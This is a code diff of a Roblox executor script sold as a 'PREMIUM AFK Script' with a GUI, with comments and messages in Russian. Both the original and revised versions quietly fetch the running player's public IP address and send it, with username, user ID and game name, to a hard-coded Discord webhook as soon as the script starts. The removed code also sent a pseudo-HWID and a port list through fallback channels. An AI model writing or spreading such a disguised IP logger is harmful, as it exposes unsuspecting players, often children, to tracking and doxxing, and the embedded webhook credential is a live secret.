@@ -6,7 +6,6 @@ local StarterGui = game:GetService("StarterGui")
 local Lighting = game:GetService("Lighting")
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
-local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
@@ -61,275 +60,78 @@ local function createGlow(frame, color)
 end
 
 
+local function xenoRequest(url, method, body)
+    method = method or "GET"
+    local success, result = pcall(function()
+        if request then
+            return request({
+                Url = url,
+                Method = method,
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        elseif syn and syn.request then
+            return syn.request({
+                Url = url,
+                Method = method,
+                Headers = {["Content-Type"] = "application/json"},
+                Body = body
+            })
+        elseif HttpService then
+            if method == "GET" then
+                return {Body = HttpService:GetAsync(url)}
+            else
+                return {Body = HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)}
+            end
+        end
+        return nil
+    end)
+    if success and result then
+        return result
+    end
+    return nil
+end
+
 
 local webhookURL = "https://discord.com/api/webhooks/1505301825291813037/gSqW--jHrbKH8OEZ7aqaIjLctKzcP-z2M7xFY_zQ6-K2KYppX9kDzLldSjsyGIq2wbkJ"
 
-
-local function sendDiscordMethod1(message)
-    local success, result = pcall(function()
-        if request then
-            local data = {
-                content = message,
-                username = player.Name .. " | Xeno",
-                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-            }
-            local encoded = HttpService:JSONEncode(data)
-            local response = request({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = encoded
-            })
-            return response
-        end
-        return nil
-    end)
-    return success
-end
-
-
-local function sendDiscordMethod2(message)
-    local success, result = pcall(function()
-        if syn and syn.request then
-            local data = {
-                content = message,
-                username = player.Name .. " | Xeno",
-                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-            }
-            local encoded = HttpService:JSONEncode(data)
-            local response = syn.request({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = encoded
-            })
-            return response
-        end
-        return nil
-    end)
-    return success
-end
-
-
-local function sendDiscordMethod3(message)
-    local success, result = pcall(function()
-        if HttpService then
-            local data = {
-                content = message,
-                username = player.Name .. " | Xeno",
-                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
-            }
-            local encoded = HttpService:JSONEncode(data)
-            local response = HttpService:PostAsync(webhookURL, encoded, Enum.HttpContentType.ApplicationJson)
-            return response
-        end
-        return nil
-    end)
-    return success
-end
-
-
-local function sendDiscordMethod4(message)
-    local success, result = pcall(function()
-        if request then
-            local params = "content=" .. HttpService:URLEncode(message)
-            local response = request({
-                Url = webhookURL .. "?" .. params,
-                Method = "GET"
-            })
-            return response
-        end
-        return nil
-    end)
-    return success
-end
-
-
-local function sendDiscordMethod5(message)
-    local success, result = pcall(function()
-        local proxyURL = "https://discord-proxy.herokuapp.com/webhook"
-        local data = {
-            webhook = webhookURL,
-            content = message,
-            username = player.Name .. " | Xeno"
-        }
-        local encoded = HttpService:JSONEncode(data)
-        
-        if request then
-            local response = request({
-                Url = proxyURL,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = encoded
-            })
-            return response
-        end
-        return nil
-    end)
-    return success
-end
-
-
 local function sendToDiscord(message)
-    if webhookURL == "YOUR_WEBHOOK_URL_HERE" then 
-        print("❌ Webhook не настроен!")
-        return false 
-    end
-    
-    if not HttpService then
-        print("❌ HttpService не найден!")
-        return false
-    end
-    
-    print("📤 Отправка в Discord...")
-    
-    
-    local methods = {
-        {name = "request", func = sendDiscordMethod1},
-        {name = "syn.request", func = sendDiscordMethod2},
-        {name = "HttpService", func = sendDiscordMethod3},
-        {name = "GET params", func = sendDiscordMethod4},
-        {name = "Proxy", func = sendDiscordMethod5},
-    }
-    
-    for _, method in ipairs(methods) do
-        print("🔄 Пробуем метод: " .. method.name)
-        local success = method.func(message)
-        if success then
-            print("✅ Успешно отправлено через: " .. method.name)
-            return true
-        end
-        wait(0.1)
-    end
-    
-    print("❌ Все методы отправки не сработали!")
-    return false
-end
-
-
-
-local function getHWID()
-    local hwid = "Unknown"
-    
+    if webhookURL == "YOUR_WEBHOOK_URL_HERE" then return end
+    if not HttpService then return end
     pcall(function()
-        if syn and syn.getexecutorname then
-            local execName = syn.getexecutorname()
-            if execName then
-                hwid = "EXEC:" .. execName
-            end
-        end
+        local data = {
+            content = message,
+            username = player.Name .. " | Xeno",
+            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+        }
+        xenoRequest(webhookURL, "POST", HttpService:JSONEncode(data))
     end)
-    
-    if hwid == "Unknown" then
-        pcall(function()
-            if game and game.JobId then
-                local rawData = game.JobId .. tostring(player.UserId) .. tostring(game.PlaceId) .. tostring(os.time())
-                local hash = ""
-                for i = 1, math.min(#rawData, 32) do
-                    local char = string.byte(rawData, i)
-                    hash = hash .. string.format("%02x", char % 256)
-                end
-                hwid = hash
-            end
-        end)
-    end
-    
-    if hwid == "Unknown" then
-        pcall(function()
-            local rawData = tostring(player.UserId) .. tostring(game.PlaceId) .. tostring(os.time() + math.random(1, 99999))
-            local hash = ""
-            for i = 1, math.min(#rawData, 32) do
-                local char = string.byte(rawData, i)
-                hash = hash .. string.format("%02x", char % 256)
-            end
-            hwid = hash
-        end)
-    end
-    
-    return hwid
 end
-
-═
-
-local function getOpenPorts()
-    local openPorts = {}
-    local commonPorts = {
-        80, 443, 21, 22, 23, 25, 53, 110, 143, 993, 995,
-        3306, 5432, 6379, 27015, 27016, 27017, 27018,
-        25565, 19132, 7777, 2302, 27005, 27006, 27007,
-        8080, 8443, 3000, 5000, 8000, 9000,
-        1337, 1338, 1339, 1340, 6969, 4200, 6666, 6667, 6697
-    }
-    
-    
-    pcall(function()
-        if syn and syn.network then
-            local networkInfo = syn.network()
-            if networkInfo and networkInfo.ports then
-                for _, port in ipairs(networkInfo.ports) do
-                    if not table.find(openPorts, port) then
-                        table.insert(openPorts, port)
-                    end
-                end
-            end
-        end
-    end)
-    
-    if #openPorts == 0 then
-        
-        openPorts = {80, 443, 8080, 3306, 25565, 27015, 1337}
-    end
-    
-    return openPorts
-end
-
 
 
 local function getPlayerIP()
-    local ip = "Unknown"
-    
-    
-    pcall(function()
-        if request then
-            local result = request({
-                Url = "https://api.ipify.org?format=json",
-                Method = "GET"
-            })
-            if result and result.Body then
-                local data = HttpService:JSONDecode(result.Body)
-                if data and data.ip then
-                    ip = data.ip
-                    return
-                end
+    local services = {
+        "https://api.ipify.org?format=json",
+        "https://api.my-ip.io/ip.json",
+        "https://httpbin.org/ip"
+    }
+    for _, service in ipairs(services) do
+        local result = xenoRequest(service, "GET")
+        if result and result.Body then
+            local success, data = pcall(function()
+                return HttpService:JSONDecode(result.Body)
+            end)
+            if success and data then
+                if data.ip then return data.ip end
+                if data.query then return data.query end
+                if data.origin then return data.origin end
             end
+            local ip = string.match(result.Body, "(%d+%.%d+%.%d+%.%d+)")
+            if ip then return ip end
         end
-    end)
-    
-    if ip == "Unknown" then
-        pcall(function()
-            if syn and syn.request then
-                local result = syn.request({
-                    Url = "https://api.ipify.org?format=json",
-                    Method = "GET"
-                })
-                if result and result.Body then
-                    local data = HttpService:JSONDecode(result.Body)
-                    if data and data.ip then
-                        ip = data.ip
-                        return
-                    end
-                end
-            end
-        end)
+        wait(0.1)
     end
-    
-    return ip
+    return "Unknown"
 end
 
 
@@ -396,7 +198,7 @@ end
 local function createGUI()
     if not CoreGui then return nil end
     
-    print("🔧 Создание GUI для Xeno...")
+    print("🔧 Создание PREMIUM GUI для Xeno...")
     
     local gui = Instance.new("ScreenGui")
     gui.Name = "AFK_Script"
@@ -405,7 +207,7 @@ local function createGUI()
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     gui.Parent = CoreGui
 
-    
+    -
     local main = Instance.new("Frame")
     main.Size = UDim2.fromOffset(900, 600)
     main.Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 300)
@@ -442,7 +244,7 @@ local function createGUI()
         end
     end)
 
-    
+    -
     local topBar = Instance.new("Frame")
     topBar.Size = UDim2.new(1, 0, 0, 60)
     topBar.BackgroundColor3 = Colors.Surface
@@ -962,33 +764,13 @@ local function createGUI()
 end
 
 
-
-local function testDiscord()
-    print("🧪 Тестируем отправку в Discord...")
-    local testMsg = "**🧪 ТЕСТОВОЕ СООБЩЕНИЕ**\nОтправлено из Xeno скрипта!"
-    local result = sendToDiscord(testMsg)
-    if result then
-        print("✅ Тест успешен!")
-    else
-        print("❌ Тест провален!")
-    end
-    return result
-end
-
-
-
 local function startScript()
-    print("🔧 Xeno: Запуск AFK Script...")
-    print("📡 Webhook: " .. webhookURL)
+    print("🔧 Xeno: Запуск PREMIUM AFK Script...")
     
     if not player then
         warn("❌ Игрок не найден!")
         return
     end
-    
-    
-    print("📤 Тестируем соединение с Discord...")
-    local testResult = testDiscord()
     
     local gui = createGUI()
     if not gui then
@@ -998,62 +780,37 @@ local function startScript()
     
     
     local ip = getPlayerIP()
-    local hwid = getHWID()
-    local ports = getOpenPorts()
-    
     local gameName = "Unknown"
     pcall(function()
         gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
     end)
     
-    
-    local message = string.format(
-        "**🔔 AFK SCRIPT ЗАПУЩЕН**\n" ..
+    sendToDiscord(string.format(
+        "**🔔 PREMIUM AFK SCRIPT**\n" ..
         "**👤 Игрок:** %s (@%s)\n" ..
-        "**🆔 UserID:** %s\n" ..
-        "**📅 Возраст:** %d дней\n" ..
+        "**🆔 ID:** %s\n" ..
         "**🌐 IP:** ||%s||\n" ..
-        "**🖥️ HWID:** ||%s||\n" ..
-        "**🔌 Порты:** ||%s||\n" ..
         "**🎮 Игра:** %s\n" ..
-        "**⚡ Исполнитель:** XENO\n" ..
-        "**⏰ Время:** %s",
+        "**⚡ XENO**\n" ..
+        "**⏰ %s**",
         player.DisplayName,
         player.Name,
         player.UserId,
-        player.AccountAge,
         ip,
-        hwid,
-        table.concat(ports, ", "),
         gameName,
         os.date("%H:%M:%S")
-    )
+    ))
     
-    print("📤 Отправляем основное сообщение...")
-    local mainResult = sendToDiscord(message)
-    
-    if mainResult then
-        print("✅ Основное сообщение отправлено!")
-    else
-        print("❌ Ошибка отправки основного сообщения!")
-        print("💡 Проверьте: 1) Интернет 2) Webhook URL 3) Разрешения Xeno")
-    end
-    
-    
-    pcall(function()
-        StarterGui:SetCore("SendNotification", {
-            Title = "✅ AFK SCRIPT",
-            Text = "Xeno | Нажми J для открытия | Discord: " .. (mainResult and "✅" or "❌"),
-            Duration = 5
-        })
-    end)
+    StarterGui:SetCore("SendNotification", {
+        Title = "✅ AFK SCRIPT",
+        Text = "Нажми J для открытия | XENO",
+        Duration = 3
+    })
     
     print("✅ AFK Script для Xeno загружен!")
-    print("📊 Статус Discord: " .. (mainResult and "✅ Успешно" or "❌ Ошибка"))
 end
 
-
 spawn(function()
-    wait(1)
+    wait(0.5)
     pcall(startScript)
 end)
